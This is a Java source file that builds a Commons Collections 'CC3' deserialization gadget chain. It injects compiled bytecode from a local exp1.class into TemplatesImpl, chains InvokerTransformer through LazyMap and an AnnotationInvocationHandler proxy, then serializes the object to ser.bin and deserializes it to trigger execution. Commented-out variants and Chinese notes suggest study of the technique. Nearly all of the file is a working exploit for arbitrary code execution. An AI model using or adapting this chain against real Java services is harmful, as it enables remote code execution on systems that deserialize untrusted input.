import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import javax.xml.transform.TransformerConfigurationException;
import java.io.*;
import java.lang.annotation.Target;
import java.lang.invoke.ConstantCallSite;
import java.lang.reflect.*;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;
import java.util.PriorityQueue;

public class cc3 {
    public static void main(String[] args) throws Exception {

        TemplatesImpl templates = new TemplatesImpl();
        Field name = templates.getClass().getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates,"123");

        Field factory = templates.getClass().getDeclaredField("_tfactory");
        factory.setAccessible(true);
        factory.set(templates,new TransformerFactoryImpl());

        byte[] code = Files.readAllBytes(Paths.get("C:\\Users\\86136\\Desktop\\cc1\\target\\classes\\exp1.class"));
        byte[][] codes = {code};
        Field word = templates.getClass().getDeclaredField("_bytecodes");
        word.setAccessible(true);
        word.set(templates,codes);
//        templates.newTransformer();


//        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});
//
//
//        //     templates.newTransformer();
//
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(templates),
                new InvokerTransformer("newTransformer",null,null)
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
//        chainedTransformer.transform(1);
        HashMap<Object,Object> hash = new HashMap<Object, Object>();
        Map<Object,Object> lazymap = LazyMap.decorate(hash,chainedTransformer);
        //lazymap.get("key");
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");

        Constructor constructor = c.getDeclaredConstructor(Class.class,Map.class);

        constructor.setAccessible(true);
        InvocationHandler instance = (InvocationHandler) constructor.newInstance(Target.class,lazymap);
        Map proxyInstance = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[]{Map.class},instance);
        Object o = constructor.newInstance(Override.class,proxyInstance);

        serialize(o);
        unserialize("ser.bin");


//        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
//        Constructor constructor = c.getDeclaredConstructor(Class.class, Map.class);
//        //设置构造方法为可访问的
//        constructor.setAccessible(true);
//        //通过反射创建 Override 类的代理对象 instance,并设置其调用会委托给 decorate 对象
//        InvocationHandler instance = (InvocationHandler) constructor.newInstance(Override.class, lazymap);
//
//        //创建Map接口的代理对象proxyInstance,并设置其调用处理器为instance
//        Map proxyInstance = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), new Class[]{Map.class}, instance);
//        //再次通过反射创建代理对象
//        Object o = constructor.newInstance(Override.class, proxyInstance);
//        serialize(o);
//        unserialize("ser.bin");





    }





    public static void serialize(Object obj) throws Exception {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String Filename) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }

}
